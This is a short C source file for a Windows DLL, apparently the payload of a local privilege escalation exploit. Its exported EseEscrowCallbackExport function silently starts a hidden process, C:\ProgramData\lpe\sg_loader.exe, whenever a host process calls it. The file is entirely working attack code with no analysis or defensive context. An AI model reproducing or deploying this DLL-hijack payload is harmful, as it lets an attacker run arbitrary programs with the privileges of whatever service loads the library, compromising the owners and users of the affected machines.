#include <windows.h>

__declspec(dllexport) int __stdcall EseEscrowCallbackExport(
    void* a, void* b, void* c, void* d, void* e, int f, void* g) {
    
    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    char loader[]="C:\\ProgramData\\lpe\\sg_loader.exe";
    CreateProcessA(loader,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
    return TRUE;
}
